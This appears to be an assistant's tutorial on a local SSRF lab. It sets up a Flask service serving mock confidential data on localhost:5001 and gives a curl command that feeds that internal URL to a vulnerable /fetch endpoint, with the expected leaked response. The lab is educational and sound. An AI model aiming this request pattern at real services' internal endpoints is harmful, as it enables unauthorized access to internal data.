To demonstrate a Server-Side Request Forgery (SSRF) vulnerability, you can create a second service that simulates a sensitive endpoint. This service will return confidential information when accessed. Below, I'll guide you through setting up a simple Flask application that acts as the second service, and then you can modify your existing SSRF demonstration app to access this service.

### Step 1: Create the Second Service

Create a new file called `confidential_service.py`:

```python
# confidential_service.py
from flask import Flask, jsonify

app = Flask(__name__)

@app.route('/confidential', methods=['GET'])
def confidential():
    return jsonify({'status': 'success', 'data': 'This is confidential information!'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)
```

### Step 2: Run the Second Service

Run the second service in a separate terminal:

```bash
python confidential_service.py
```

This service will be accessible at `http://localhost:5001/confidential`.

### Step 3: Modify the SSRF Demonstration App

You can modify your SSRF demonstration app to allow fetching from the second service. For demonstration purposes, you can use a specific URL that points to the confidential service. 

You can test the SSRF by sending a request to the `/fetch` endpoint with the URL of the confidential service:

```bash
curl -X POST http://localhost:5000/fetch -H "Content-Type: application/json" -d '{"url": "http://localhost:5001/confidential"}'
```

### Step 4: Test the SSRF

When you run the above `curl` command, the SSRF demonstration app will attempt to fetch data from the confidential service. If everything is set up correctly, you should see a response that includes the confidential information:

```json
{
    "status": "success",
    "data": "{\"status\": \"success\", \"data\": \"This is confidential information!\"}"
}
```

### Important Note

This setup is for educational purposes only. SSRF vulnerabilities can lead to serious security issues, including unauthorized access to internal services and data leaks. Always ensure that your applications are secure and validate user input to prevent such vulnerabilities.